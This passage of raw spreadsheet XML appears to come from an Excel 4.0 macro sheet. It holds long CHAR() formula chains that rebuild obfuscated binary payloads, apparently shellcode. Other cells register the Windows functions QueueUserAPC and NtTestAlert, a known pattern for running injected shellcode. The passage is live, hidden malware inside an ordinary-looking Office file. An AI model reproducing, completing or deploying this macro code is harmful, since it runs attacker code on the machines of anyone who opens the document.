R(128)&amp;CHAR(139)&amp;CHAR(89)&amp;CHAR(97)&amp;CHAR(130)&amp;CHAR(78)&amp;CHAR(141)&amp;CHAR(80)&amp;CHAR(210)&amp;CHAR(154)&amp;CHAR(60)&amp;CHAR(62)&amp;CHAR(218)&amp;CHAR(28)&amp;CHAR(59)&amp;CHAR(35)&amp;CHAR(77)&amp;CHAR(13)&amp;CHAR(66)&amp;CHAR(202)&amp;CHAR(187)&amp;CHAR(165)&amp;CHAR(36)&amp;CHAR(191)&amp;CHAR(22)&amp;CHAR(15)&amp;CHAR(111)&amp;CHAR(129)&amp;CHAR(190)&amp;CHAR(222)&amp;CHAR(124)&amp;CHAR(58)&amp;CHAR(96)&amp;CHAR(125)&amp;CHAR(92)&amp;CHAR(103)&amp;CHAR(149)&amp;CHAR(165)&amp;CHAR(168)&amp;CHAR(91)&amp;CHAR(139)&amp;CHAR(222)&amp;CHAR(97)&amp;CHAR(204)</f>
        <v>q _x001C_t™Ýk²v-fŽA%üðªÂæêS	©Öñ€Lh©«°­Á(•ÓpGwÿûfõ#1_x000B_	Ë¸_x001F_ô_x000E_[”ÐÊv'voÈ€^û¦,_x0016_°•q†˜Ê™Â0€›_x0004_ö9;s©_x0004_Ô‚_x001B_@®Èn”ò_x0013_Ž(l29Š`B@øeŠ·T3P§l5ëq_x0008_Ü_x0003_*_x000C_’Ð«¨¤ÇÃ‹_x000B_î›7aÂåw&lt;Œ_¾µ¸M0_x001B__x001D_Sï.˜Emö‡s%Ìða¯_x000B_Æ¸_x0014_¥
²$âtþCßlµ_x0004_¶&amp;ˆV4»V_x001D_ï(.ÆÝ–s+zl„°_x0005_â¹ÑÚié/x€‹Ya‚NPÒš&lt;&gt;Ú_x001C_;#M_x000D_BÊ»¥$¿_x0016__x000F_o¾Þ|:`}\g•¥¨[‹ÞaÌ</v>
      </c>
      <c r="C27" t="str">
        <f>CHAR(134)&amp;CHAR(240)&amp;CHAR(113)&amp;CHAR(122)&amp;CHAR(237)&amp;CHAR(162)&amp;CHAR(26)&amp;CHAR(111)&amp;CHAR(157)&amp;CHAR(220)</f>
        <v>†ðqzí¢_x001A_oÜ</v>
      </c>
    </row>
    <row r="28" spans="1:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="A28" t="b">
        <f>REGISTER("Kernel32","QueueUserAPC","JJJJ","Queue",,1,9)</f>
        <v>0</v>
      </c>
      <c r="B28" t="str">
        <f>CHAR(149)&amp;CHAR(174)&amp;CHAR(182)&amp;CHAR(78)&amp;CHAR(45)&amp;CHAR(156)&amp;CHAR(84)&amp;CHAR(62)&amp;CHAR(101)&amp;CHAR(164)&amp;CHAR(19)&amp;CHAR(99)&amp;CHAR(239)&amp;CHAR(50)&amp;CHAR(19)&amp;CHAR(225)&amp;CHAR(65)&amp;CHAR(243)&amp;CHAR(192)&amp;CHAR(95)&amp;CHAR(205)&amp;CHAR(5)&amp;CHAR(170)&amp;CHAR(62)&amp;CHAR(130)&amp;CHAR(250)&amp;CHAR(15)&amp;CHAR(220)&amp;CHAR(114)&amp;CHAR(155)&amp;CHAR(83)&amp;CHAR(39)&amp;CHAR(250)&amp;CHAR(246)&amp;CHAR(140)&amp;CHAR(182)&amp;CHAR(96)&amp;CHAR(109)&amp;CHAR(165)&amp;CHAR(141)&amp;CHAR(210)&amp;CHAR(102)&amp;CHAR(189)&amp;CHAR(213)&amp;CHAR(70)&amp;CHAR(57)&amp;CHAR(232)&amp;CHAR(38)&amp;CHAR(80)&amp;CHAR(54)&amp;CHAR(139)&amp;CHAR(255)&amp;CHAR(19)&amp;CHAR(119)&amp;CHAR(73)&amp;CHAR(247)&amp;CHAR(67)&amp;CHAR(32)&amp;CHAR(13)&amp;CHAR(231)&amp;CHAR(227)&amp;CHAR(167)&amp;CHAR(114)&amp;CHAR(56)&amp;CHAR(210)&amp;CHAR(196)&amp;CHAR(88)&amp;CHAR(99)&amp;CHAR(49)&amp;CHAR(131)&amp;CHAR(134)&amp;CHAR(191)&amp;CHAR(66)&amp;CHAR(205)&amp;CHAR(14)&amp;CHAR(192)&amp;CHAR(217)&amp;CHAR(57)&amp;CHAR(109)&amp;CHAR(76)&amp;CHAR(235)&amp;CHAR(140)&amp;CHAR(35)&amp;CHAR(110)&amp;CHAR(230)&amp;CHAR(158)&amp;CHAR(53)&amp;CHAR(93)&amp;CHAR(188)&amp;CHAR(186)&amp;CHAR(99)&amp;CHAR(77)&amp;CHAR(169)&amp;CHAR(225)&amp;CHAR(52)&amp;CHAR(183)&amp;CHAR(67)&amp;CHAR(112)&amp;CHAR(182)&amp;CHAR(45)&amp;CHAR(93)&amp;CHAR(243)&amp;CHAR(70)&amp;CHAR(103)&amp;CHAR(217)&amp;CHAR(65)&amp;CHAR(159)&amp;CHAR(4)&amp;CHAR(212)&amp;CHAR(173)&amp;CHAR(150)&amp;CHAR(126)&amp;CHAR(24)&amp;CHAR(55)&amp;CHAR(210)&amp;CHAR(245)&amp;CHAR(245)&amp;CHAR(157)&amp;CHAR(4)&amp;CHAR(166)&amp;CHAR(71)&amp;CHAR(27)&amp;CHAR(239)&amp;CHAR(157)&amp;CHAR(27)&amp;CHAR(114)&amp;CHAR(193)&amp;CHAR(199)&amp;CHAR(124)&amp;CHAR(229)&amp;CHAR(13)&amp;CHAR(179)&amp;CHAR(151)&amp;CHAR(11)&amp;CHAR(66)&amp;CHAR(68)&amp;CHAR(96)&amp;CHAR(161)&amp;CHAR(74)&amp;CHAR(31)&amp;CHAR(242)&amp;CHAR(35)&amp;CHAR(149)&amp;CHAR(231)&amp;CHAR(114)&amp;CHAR(159)&amp;CHAR(15)&amp;CHAR(44)&amp;CHAR(142)&amp;CHAR(119)&amp;CHAR(12)&amp;CHAR(84)&amp;CHAR(192)&amp;CHAR(216)&amp;CHAR(234)&amp;CHAR(47)&amp;CHAR(165)&amp;CHAR(174)&amp;CHAR(99)&amp;CHAR(134)&amp;CHAR(68)&amp;CHAR(83)&amp;CHAR(128)&amp;CHAR(210)&amp;CHAR(117)&amp;CHAR(128)&amp;CHAR(46)&amp;CHAR(117)&amp;CHAR(111)&amp;CHAR(48)&amp;CHAR(224)&amp;CHAR(107)&amp;CHAR(133)&amp;CHAR(16)&amp;CHAR(253)&amp;CHAR(145)&amp;CHAR(136)&amp;CHAR(147)&amp;CHAR(222)&amp;CHAR(62)&amp;CHAR(179)&amp;CHAR(169)&amp;CHAR(194)&amp;CHAR(92)&amp;CHAR(126)&amp;CHAR(113)&amp;CHAR(35)&amp;CHAR(76)&amp;CHAR(248)&amp;CHAR(137)&amp;CHAR(143)&amp;CHAR(40)&amp;CHAR(115)&amp;CHAR(245)&amp;CHAR(120)&amp;CHAR(108)&amp;CHAR(47)&amp;CHAR(98)&amp;CHAR(63)&amp;CHAR(25)&amp;CHAR(52)&amp;CHAR(77)&amp;CHAR(244)&amp;CHAR(66)&amp;CHAR(29)&amp;CHAR(193)&amp;CHAR(38)&amp;CHAR(35)&amp;CHAR(164)&amp;CHAR(64)&amp;CHAR(52)&amp;CHAR(181)&amp;CHAR(162)&amp;CHAR(1)&amp;CHAR(131)&amp;CHAR(124)&amp;CHAR(61)&amp;CHAR(81)&amp;CHAR(76)&amp;CHAR(29)&amp;CHAR(224)&amp;CHAR(172)&amp;CHAR(243)&amp;CHAR(103)&amp;CHAR(159)&amp;CHAR(168)&amp;CHAR(252)&amp;CHAR(79)&amp;CHAR(109)&amp;CHAR(123)&amp;CHAR(73)&amp;CHAR(129)&amp;CHAR(175)&amp;CHAR(18)&amp;CHAR(67)&amp;CHAR(141)&amp;CHAR(183)&amp;CHAR(143)&amp;CHAR(132)&amp;CHAR(205)&amp;CHAR(116)&amp;CHAR(169)&amp;CHAR(5)&amp;CHAR(99)&amp;CHAR(38)&amp;CHAR(44)&amp;CHAR(85)&amp;CHAR(117)&amp;CHAR(31)&amp;CHAR(195)&amp;CHAR(122)&amp;CHAR(84)&amp;CHAR(9)&amp;CHAR(222)&amp;CHAR(77)</f>
        <v>•®¶N-œT&gt;e¤_x0013_cï2_x0013_áAóÀ_Í_x0005_ª&gt;‚ú_x000F_Ür›S'úöŒ¶`m¥Òf½ÕF9è&amp;P6‹ÿ_x0013_wI÷C _x000D_çã§r8ÒÄXc1ƒ†¿BÍ_x000E_ÀÙ9mLëŒ#næž5]¼ºcM©á4·Cp¶-]óFgÙAŸ_x0004_Ô­–~_x0018_7Òõõ_x0004_¦G_x001B_ï_x001B_rÁÇ|å_x000D_³—_x000B_BD`¡J_x001F_ò#•çrŸ_x000F_,Žw_x000C_TÀØê/¥®c†DS€Òu€.uo0àk…_x0010_ý‘ˆ“Þ&gt;³©Â\~q#Lø‰(sõxl/b?_x0019_4MôB_x001D_Á&amp;#¤@4µ¢_x0001_ƒ|=QL_x001D_à¬ógŸ¨üOm{I¯_x0012_C·„Ít©_x0005_c&amp;,Uu_x001F_ÃzT	ÞM</v>
      </c>
      <c r="C28" t="str">
        <f>CHAR(113)&amp;CHAR(122)&amp;CHAR(136)&amp;CHAR(162)&amp;CHAR(18)&amp;CHAR(157)&amp;CHAR(136)&amp;CHAR(189)&amp;CHAR(248)&amp;CHAR(138)</f>
        <v>qzˆ¢_x0012_ˆ½øŠ</v>
      </c>
    </row>
    <row r="29" spans="1:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="A29" t="b">
        <f>REGISTER("ntdll","NtTestAlert","J","Go",,1,9)</f>
        <v>0</v>
      </c>
      <c r="B29" t="str">
        <f>CHAR(38)&amp;CHAR(31)&amp;CHAR(158)&amp;CHAR(151)&amp;CHAR(65)&amp;CHAR(68)&amp;CHAR(143)&amp;CHAR(173)&amp;CHAR(187)&amp;CHAR(236)&amp;CHAR(124)&amp;CHAR(157)&amp;CHAR(145)&amp;CHAR(158)&amp;CHAR(33)&amp;CHAR(45)&amp;CHAR(76)&amp;CHAR(190)&amp;CHAR(10)&amp;CHAR(46)&amp;CHAR(216)&amp;CHAR(173)&amp;CHAR(188)&amp;CHAR(20)&amp;CHAR(90)&amp;CHAR(69)&amp;CHAR(38)&amp;CHAR(105)&amp;CHAR(252)&amp;CHAR(235)&amp;CHAR(3)&amp;CHAR(212)&amp;CHAR(121)&amp;CHAR(118)&amp;CHAR(112)&amp;CHAR(123)&amp;CHAR(47)&amp;CHAR(241)&amp;CHAR(76)&amp;CHAR(183)&amp;CHAR(9)&amp;CHAR(19)&amp;CHAR(66)&amp;CHAR(224)&amp;CHAR(92)&amp;CHAR(182)&amp;CHAR(165)&amp;CHAR(172)&amp;CHAR(154)&amp;CHAR(115)&amp;CHAR(92)&amp;CHAR(199)&amp;CHAR(131)&amp;CHAR(3)&amp;CHAR(188)&amp;CHAR(83)&amp;CHAR(222)&amp;CHAR(153)&amp;CHAR(173)&amp;CHAR(210)&amp;CHAR(242)&amp;CHAR(210)&amp;CHAR(86)&amp;CHAR(61)&amp;CHAR(107)&amp;CHAR(26)&amp;CHAR(145)&amp;CHAR(141)&amp;CHAR(58)&amp;CHAR(251)&amp;CHAR(212)&amp;CHAR(224)&amp;CHAR(162)&amp;CHAR(213)&amp;CHAR(140)&amp;CHAR(175)&amp;CHAR(76)&amp;CHAR(246)&amp;CHAR(74)&amp;CHAR(183)&amp;CHAR(73)&amp;CHAR(155)&amp;CHAR(39)&amp;CHAR(149)&amp;CHAR(218)&amp;CHAR(18)&amp;CHAR(120)&amp;CHAR(90)&amp;CHAR(167)&amp;CHAR(35)&amp;CHAR(216)&amp;CHAR(98)&amp;CHAR(74)&amp;CHAR(67)&amp;CHAR(1)&amp;CHAR(181)&amp;CHAR(238)&amp;CHAR(100)&amp;CHAR(186)&amp;CHAR(90)&amp;CHAR(178)&amp;CHAR(134)&amp;CHAR(28)&amp;CHAR(73)&amp;CHAR(233)&amp;CHAR(85)&amp;CHAR(99)&amp;CHAR(120)&amp;CHAR(34)&amp;CHAR(36)&amp;CHAR(31)&amp;CHAR(90)&amp;CHAR(199)&amp;CHAR(184)&amp;CHAR(64)&amp;CHAR(174)&amp;CHAR(58)&amp;CHAR(246)&amp;CHAR(255)&amp;CHAR(67)&amp;CHAR(233)&amp;CHAR(112)&amp;CHAR(140)&amp;CHAR(163)&amp;CHAR(110)&amp;CHAR(249)&amp;CHAR(116)&amp;CHAR(113)&amp;CHAR(43)&amp;CHAR(119)&amp;CHAR(126)&amp;CHAR(229)&amp;CHAR(236)&amp;CHAR(18)&amp;CHAR(233)&amp;CHAR(232)&amp;CHAR(101)&amp;CHAR(108)&amp;CHAR(6)&amp;CHAR(69)&amp;CHAR(18)&amp;CHAR(16)&amp;CHAR(27)&amp;CHAR(242)&amp;CHAR(135)&amp;CHAR(93)&amp;CHAR(228)&amp;CHAR(52)&amp;CHAR(199)&amp;CHAR(44)&amp;CHAR(147)&amp;CHAR(108)&amp;CHAR(112)&amp;CHAR(141)&amp;CHAR(43)&amp;CHAR(254)&amp;CHAR(7)&amp;CHAR(118)&amp;CHAR(167)&amp;CHAR(156)&amp;CHAR(82)&amp;CHAR(200)&amp;CHAR(36)&amp;CHAR(103)&amp;CHAR(140)&amp;CHAR(77)&amp;CHAR(55)&amp;CHAR(162)&amp;CHAR(43)&amp;CHAR(128)&amp;CHAR(210)&amp;CHAR(213)&amp;CHAR(173)&amp;CHAR(31)&amp;CHAR(170)&amp;CHAR(91)&amp;CHAR(239)&amp;CHAR(176)&amp;CHAR(172)&amp;CHAR(244)&amp;CHAR(226)&amp;CHAR(33)&amp;CHAR(80)&amp;CHAR(73)&amp;CHAR(180)&amp;CHAR(177)&amp;CHAR(123)&amp;CHAR(123)&amp;CHAR(4)&amp;CHAR(170)&amp;CHAR(18)&amp;CHAR(210)&amp;CHAR(9)&amp;CHAR(211)&amp;CHAR(59)&amp;CHAR(52)&amp;CHAR(98)&amp;CHAR(118)&amp;CHAR(132)&amp;CHAR(145)&amp;CHAR(192)&amp;CHAR(192)&amp;CHAR(60)&amp;CHAR(75)&amp;CHAR(23)&amp;CHAR(176)&amp;CHAR(11)&amp;CHAR(15)&amp;CHAR(40)&amp;CHAR(127)&amp;CHAR(31)&amp;CHAR(175)&amp;CHAR(176)&amp;CHAR(201)&amp;CHAR(58)&amp;CHAR(91)&amp;CHAR(208)&amp;CHAR(96)&amp;CHAR(167)&amp;CHAR(210)&amp;CHAR(175)&amp;CHAR(151)&amp;CHAR(66)&amp;CHAR(160)&amp;CHAR(219)&amp;CHAR(222)&amp;CHAR(34)&amp;CHAR(54)&amp;CHAR(248)&amp;CHAR(88)&amp;CHAR(207)&amp;CHAR(9)&amp;CHAR(154)&amp;CHAR(214)&amp;CHAR(14)&amp;CHAR(116)&amp;CHAR(201)&amp;CHAR(127)&amp;CHAR(151)&amp;CHAR(3)&amp;CHAR(223)&amp;CHAR(215)&amp;CHAR(85)&amp;CHAR(204)&amp;CHAR(61)&amp;CHAR(21)&amp;CHAR(120)&amp;CHAR(7)&amp;CHAR(48)&amp;CHAR(242)&amp;CHAR(36)&amp;CHAR(109)&amp;CHAR(31)&amp;CHAR(135)&amp;CHAR(81)</f>
        <v>&amp;_x001F_ž—AD­»ì|‘ž!-L¾
.Ø­¼_x0014_ZE&amp;iüë_x0003_Ôyvp{/ñL·	_x0013_Bà\¶¥¬šs\Çƒ_x0003_¼SÞ™­ÒòÒV=k_x001A_‘:ûÔà¢ÕŒ¯LöJ·I›'•Ú_x0012_xZ§#ØbJC_x0001_µîdºZ²†_x001C_IéUcx"$_x001F_ZÇ¸@®:öÿCépŒ£nùtq+w~åì_x0012_éèel_x0006_E_x0012__x0010__x001B_ò‡]ä4Ç,“lp+þ_x0007_v§œRÈ$gŒM7¢+€ÒÕ­_x001F_ª[ï°¬ôâ!PI´±{{_x0004_ª_x0012_Ò	Ó;4bv„‘ÀÀ&lt;K_x0017_°_x000B__x000F_(_x001F_¯°É:[Ð`§Ò¯—B ÛÞ"6øXÏ	šÖ_x000E_tÉ—_x0003_ß×UÌ=_x0015_x_x0007_0ò$m_x001F_‡Q</v>
      </c>
      <c r="C29" t="str">
        <f>CHAR(192)&amp;CHAR(103)&amp;CHAR(132)&amp;CHAR(217)&amp;CHAR(190)&amp;CHAR(244)&amp;CHAR(113)&amp;CHAR(50)&amp;CHAR(5)&amp;CHAR(231)</f>
        <v>Àg„Ù¾ôq2_x0005_ç</v>
      </c>
    </row>
    <row r="30" spans="1:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="A30" t="b">
        <f bx="1">main=$C$1</f>
        <v>0</v>
      </c>
      <c r="B30" t="str">
        <f>CHAR(107)&amp;CHAR(7)&amp;CHAR(87)&amp;CHAR(87)&amp;CHAR(225)&amp;CHAR(140)&amp;CHAR(26)&amp;CHAR(146)&amp;CHAR(178)&amp;CHAR(31)&amp;CHAR(232)&amp;CHAR(213)&amp;CHAR(146)&amp;CHAR(43)&amp;CHAR(231)&amp;CHAR(70)&amp;CHAR(198)&amp;CHAR(147)&amp;CHAR(154)&amp;CHAR(36)&amp;CHAR(123)&amp;CHAR(193)&amp;CHAR(121)&amp;CHAR(84)&amp;CHAR(76)&amp;CHAR(48)&amp;CHAR(177)&amp;CHAR(105)&amp;CHAR(149)&amp;CHAR(218)&amp;CHAR(114)&amp;CHAR(2)&amp;CHAR(224)&amp;CHAR(75)&amp;CHAR(177)&amp;CHAR(149)&amp;CHAR(240)&amp;CHAR(26)&amp;CHAR(156)&amp;CHAR(222)&amp;CHAR(218)&amp;CHAR(68)&amp;CHAR(157)&amp;CHAR(120)&amp;CHAR(41)&amp;CHAR(234)&amp;CHAR(178)&amp;CHAR(110)&amp;CHAR(247)&amp;CHAR(58)&amp;CHAR(219)&amp;CHAR(8)&amp;CHAR(209)&amp;CHAR(161)&amp;CHAR(99)&amp;CHAR(100)&amp;CHAR(164)&amp;CHAR(217)&amp;CHAR(228)&amp;CHAR(125)&amp;CHAR(8)&amp;CHAR(64)&amp;CHAR(97)&amp;CHAR(145)&amp;CHAR(88)&amp;CHAR(197)&amp;CHAR(158)&amp;CHAR(146)&amp;CHAR(237)&amp;CHAR(191)&amp;CHAR(44)&amp;CHAR(185)&amp;CHAR(25)&amp;CHAR(138)&amp;CHAR(175)&amp;CHAR(252)&amp;CHAR(232)&amp;CHAR(14)&amp;CHAR(232)&amp;CHAR(159)&amp;CHAR(201)&amp;CHAR(204)&amp;CHAR(169)&amp;CHAR(145)&amp;CHAR(213)&amp;CHAR(254)&amp;CHAR(153)&amp;CHAR(92)&amp;CHAR(63)&amp;CHAR(148)&amp;CHAR(139)&amp;CHAR(84)&amp;CHAR(238)&amp;CHAR(172)&amp;CHAR(10)&amp;CHAR(172)&amp;CHAR(13)&amp;CHAR(36)&amp;CHAR(69)&amp;CHAR(178)&amp;CHAR(10)&amp;CHAR(184)&amp;CHAR(95)&amp;CHAR(124)&amp;CHAR(122)&amp;CHAR(176)&amp;CHAR(212)&amp;CHAR(36)&amp;CHAR(249)&amp;CHAR(4)&amp;CHAR(236)&amp;CHAR(103)&amp;CHAR(207)&amp;CHAR(133)&amp;CHAR(90)&amp;CHAR(196)&amp;CHAR(91)&amp;CHAR(20)&amp;CHAR(213)&amp;CHAR(25)&amp;CHAR(14)&amp;CHAR(100)&amp;CHAR(182)&amp;CHAR(77)&amp;CHAR(209)&amp;CHAR(170)&amp;CHAR(164)&amp;CHAR(137)&amp;CHAR(112)&amp;CHAR(75)&amp;CHAR(156)&amp;CHAR(125)&amp;CHAR(240)&amp;CHAR(195)&amp;CHAR(214)&amp;CHAR(153)&amp;CHAR(41)&amp;CHAR(151)&amp;CHAR(55)&amp;CHAR(147)&amp;CHAR(143)&amp;CHAR(95)&amp;CHAR(141)&amp;CHAR(161)&amp;CHAR(85)&amp;CHAR(34)&amp;CHAR(52)&amp;CHAR(71)&amp;CHAR(74)&amp;CHAR(40)&amp;CHAR(111)&amp;CHAR(165)&amp;CHAR(203)&amp;CHAR(77)&amp;CHAR(182)&amp;CHAR(118)&amp;CHAR(106)&amp;CHAR(7)&amp;CHAR(252)&amp;CHAR(169)&amp;CHAR(61)&amp;CHAR(173)&amp;CHAR(133)&amp;CHAR(96)&amp;CHAR(178)&amp;CHAR(223)&amp;CHAR(11)&amp;CHAR(99)&amp;CHAR(248)&amp;CHAR(104)&amp;CHAR(142)&amp;CHAR(37)&amp;CHAR(246)&amp;CHAR(174)&amp;CHAR(225)&amp;CHAR(35)&amp;CHAR(1)&amp;CHAR(164)&amp;CHAR(242)&amp;CHAR(174)&amp;CHAR(91)&amp;CHAR(127)&amp;CHAR(255)&amp;CHAR(104)&amp;CHAR(198)&amp;CHAR(128)&amp;CHAR(4)&amp;CHAR(126)&amp;CHAR(202)&amp;CHAR(24)&amp;CHAR(233)&amp;CHAR(2)&amp;CHAR(123)&amp;CHAR(138)&amp;CHAR(151)&amp;CHAR(194)&amp;CHAR(201)&amp;CHAR(16)&amp;CHAR(78)&amp;CHAR(91)&amp;CHAR(67)&amp;CHAR(149)&amp;CHAR(215)&amp;CHAR(183)&amp;CHAR(252)&amp;CHAR(117)&amp;CHAR(186)&amp;CHAR(193)&amp;CHAR(183)&amp;CHAR(30)&amp;CHAR(159)&amp;CHAR(223)&amp;CHAR(146)&amp;CHAR(12)&amp;CHAR(8)&amp;CHAR(231)&amp;CHAR(99)&amp;CHAR(214)&amp;CHAR(3)&amp;CHAR(96)&amp;CHAR(233)&amp;CHAR(166)&amp;CHAR(114)&amp;CHAR(177)&amp;CHAR(92)&amp;CHAR(99)&amp;CHAR(33)&amp;CHAR(182)&amp;CHAR(53)&amp;CHAR(153)&amp;CHAR(48)&amp;CHAR(91)&amp;CHAR(2)&amp;CHAR(129)&amp;CHAR(165)&amp;CHAR(30)&amp;CHAR(252)&amp;CHAR(132)&amp;CHAR(167)&amp;CHAR(127)&amp;CHAR(41)&amp;CHAR(18)&amp;CHAR(12)&amp;CHAR(199)&amp;CHAR(63)&amp;CHAR(102)&amp;CHAR(10)&amp;CHAR(21)&amp;CHAR(135)&amp;CHAR(101)&amp;CHAR(96)&amp;CHAR(89)&amp;CHAR(199)&amp;CHAR(202)&amp;CHAR(4)</f>
        <v>k_x0007_WWáŒ_x001A_’²_x001F_èÕ’+çFÆ“š${ÁyTL0±i•Úr_x0002_àK±•ð_x001A_œÞÚDx)ê²n÷:Û_x0008_Ñ¡cd¤Ùä}_x0008_@a‘XÅž’í¿,¹_x0019_Š¯üè_x000E_èŸÉÌ©‘Õþ™\?”‹Tî¬
¬_x000D_$E²
¸_|z°Ô$ù_x0004_ìgÏ…ZÄ[_x0014_Õ_x0019__x000E_d¶MÑª¤‰pKœ}ðÃÖ™)—7“_¡U"4GJ(o¥ËM¶vj_x0007_ü©=­…`²ß_x000B_cøhŽ%ö®á#_x0001_¤ò®[ÿhÆ€_x0004_~Ê_x0018_é_x0002_{Š—ÂÉ_x0010_N[C•×·üuºÁ·_x001E_Ÿß’_x000C__x0008_çcÖ_x0003_`é¦r±\c!¶5™0[_x0002_¥_x001E_ü„§)_x0012__x000C_Ç?f
_x0015_‡e`YÇÊ_x0004_</v>
      </c>
      <c r="C30" t="str">
        <f>CHAR(207)&amp;CHAR(93)&amp;CHAR(184)&amp;CHAR(244)&amp;CHAR(153)&amp;CHAR(97)&amp;CHAR(140)&amp;CHAR(234)&amp;CHAR(145)&amp;CHAR(62)</f>
        <v>Ï]¸ô™aŒê‘&gt;</v>
      </c>
    </row>
    <row r="31" spans="1:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="A31" t="b">
        <f>SET.VALUE(D1,0)</f>
        <v>0</v>
      </c>
      <c r="B31" t="str">
        <f>CHAR(9)&amp;CHAR(91)&amp;CHAR(253)&amp;CHAR(252)&amp;CHAR(1)&amp;CHAR(58)&amp;CHAR(27)&amp;CHAR(201)&amp;CHAR(236)&amp;CHAR(171)&amp;CHAR(208)&amp;CHAR(76)&amp;CHAR(162)&amp;CHAR(50)&amp;CHAR(114)&amp;CHAR(8)&amp;CHAR(197)&amp;CHAR(19)&amp;CHAR(104)&amp;CHAR(249)&amp;CHAR(184)&amp;CHAR(116)&amp;CHAR(254)&amp;CHAR(52)&amp;CHAR(166)&amp;CHAR(254)&amp;CHAR(22)&amp;CHAR(161)&amp;CHAR(112)&amp;CHAR(93)&amp;CHAR(96)&amp;CHAR(62)&amp;CHAR(61)&amp;CHAR(234)&amp;CHAR(60)&amp;CHAR(183)&amp;CHAR(12)&amp;CHAR(204)&amp;CHAR(216)&amp;CHAR(81)&amp;CHAR(94)&amp;CHAR(118)&amp;CHAR(228)&amp;CHAR(2)&amp;CHAR(124)&amp;CHAR(154)&amp;CHAR(104)&amp;CHAR(220)&amp;CHAR(21)&amp;CHAR(126)&amp;CHAR(219)&amp;CHAR(177)&amp;CHAR(158)&amp;CHAR(234)&amp;CHAR(133)&amp;CHAR(221)&amp;CHAR(83)&amp;CHAR(92)&amp;CHAR(5)&amp;CHAR(229)&amp;CHAR(191)&amp;CHAR(124)&amp;CHAR(108)&amp;CHAR(45)&amp;CHAR(5)&amp;CHAR(172)&amp;CHAR(35)&amp;CHAR(246)&amp;CHAR(160)&amp;CHAR(94)&amp;CHAR(105)&amp;CHAR(214)&amp;CHAR(98)&amp;CHAR(78)&amp;CHAR(158)&amp;CHAR(60)&amp;CHAR(138)&amp;CHAR(141)&amp;CHAR(178)&amp;CHAR(46)&amp;CHAR(168)&amp;CHAR(181)&amp;CHAR(45)&amp;CHAR(98)&amp;CHAR(245)&amp;CHAR(195)&amp;CHAR(212)&amp;CHAR(216)&amp;CHAR(197)&amp;CHAR(100)&amp;CHAR(209)&amp;CHAR(255)&amp;CHAR(136)&amp;CHAR(103)&amp;CHAR(152)&amp;CHAR(113)&amp;CHAR(49)&amp;CHAR(217)&amp;CHAR(100)&amp;CHAR(6)&amp;CHAR(105)&amp;CHAR(70)&amp;CHAR(207)&amp;CHAR(116)&amp;CHAR(231)&amp;CHAR(254)&amp;CHAR(151)&amp;CHAR(169)&amp;CHAR(20)&amp;CHAR(65)&amp;CHAR(239)&amp;CHAR(107)&amp;CHAR(101)&amp;CHAR(150)&amp;CHAR(32)&amp;CHAR(183)&amp;CHAR(139)&amp;CHAR(98)&amp;CHAR(44)&amp;CHAR(162)&amp;CHAR(214)&amp;CHAR(199)&amp;CHAR(185)&amp;CHAR(221)&amp;CHAR(221)&amp;CHAR(236)&amp;CHAR(109)&amp;CHAR(53)&amp;CHAR(238)&amp;CHAR(183)&amp;CHAR(15)&amp;CHAR(32)&amp;CHAR(41)&amp;CHAR(223)&amp;CHAR(196)&amp;CHAR(132)&amp;CHAR(162)&amp;CHAR(198)&amp;CHAR(10)&amp;CHAR(160)&amp;CHAR(90)&amp;CHAR(24)&amp;CHAR(17)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(2)&amp;CHAR(38)&amp;CHAR(85)&amp;CHAR(68)&amp;CHAR(140)&amp;CHAR(2)&amp;CHAR(29)&amp;CHAR(114)&amp;CHAR(96)&amp;CHAR(194)&amp;CHAR(72)&amp;CHAR(42)&amp;CHAR(173)&amp;CHAR(238)&amp;CHAR(121)&amp;CHAR(155)&amp;CHAR(7)&amp;CHAR(253)&amp;CHAR(52)&amp;CHAR(240)&amp;CHAR(142)&amp;CHAR(146)&amp;CHAR(162)&amp;CHAR(79)&amp;CHAR(166)&amp;CHAR(92)&amp;CHAR(57)&amp;CHAR(200)&amp;CHAR(249)&amp;CHAR(233)&amp;CHAR(194)&amp;CHAR(105)&amp;CHAR(8)&amp;CHAR(62)&amp;CHAR(163)&amp;CHAR(124)&amp;CHAR(189)&amp;CHAR(201)&amp;CHAR(42)&amp;CHAR(142)&amp;CHAR(235)&amp;CHAR(182)&amp;CHAR(30)&amp;CHAR(192)&amp;CHAR(122)&amp;CHAR(230)&amp;CHAR(215)&amp;CHAR(48)&amp;CHAR(114)&amp;CHAR(61)&amp;CHAR(1)&amp;CHAR(185)&amp;CHAR(153)&amp;CHAR(122)&amp;CHAR(103)&amp;CHAR(41)&amp;CHAR(121)&amp;CHAR(81)&amp;CHAR(191)&amp;CHAR(145)&amp;CHAR(186)&amp;CHAR(27)&amp;CHAR(39)&amp;CHAR(194)&amp;CHAR(225)&amp;CHAR(124)&amp;CHAR(195)&amp;CHAR(195)&amp;CHAR(137)&amp;CHAR(185)&amp;CHAR(224)&amp;CHAR(206)&amp;CHAR(56)&amp;CHAR(233)&amp;CHAR(164)&amp;CHAR(156)&amp;CHAR(17)&amp;CHAR(147)&amp;CHAR(186)&amp;CHAR(128)&amp;CHAR(201)&amp;CHAR(18)&amp;CHAR(102)&amp;CHAR(192)&amp;CHAR(227)&amp;CHAR(129)&amp;CHAR(23)&amp;CHAR(92)&amp;CHAR(100)&amp;CHAR(104)&amp;CHAR(131)&amp;CHAR(178)&amp;CHAR(174)&amp;CHAR(55)&amp;CHAR(9)&amp;CHAR(10)&amp;CHAR(108)&amp;CHAR(198)&amp;CHAR(4)&amp;CHAR(141)&amp;CHAR(213)&amp;CHAR(163)&amp;CHAR(225)&amp;CHAR(65)&amp;CHAR(162)&amp;CHAR(212)&amp;CHAR(135)&amp;CHAR(192)&amp;CHAR(120)&amp;CHAR(92)</f>
        <v xml:space="preserve">	[ýü_x0001_:_x001B_Éì«ÐL¢2r_x0008_Å_x0013_hù¸tþ4¦þ_x0016_¡p]`&gt;=ê&lt;·_x000C_ÌØQ^vä_x0002_|šhÜ_x0015_~Û±žê…ÝS\_x0005_å¿|l-_x0005_¬#ö ^iÖbNž&lt;Š².¨µ-bõÃÔØÅdÑÿˆg˜q1Ùd_x0006_iFÏtçþ—©_x0014_Aïke– ·‹b,¢ÖÇ¹ÝÝìm5î·_x000F_ )ßÄ„¢Æ
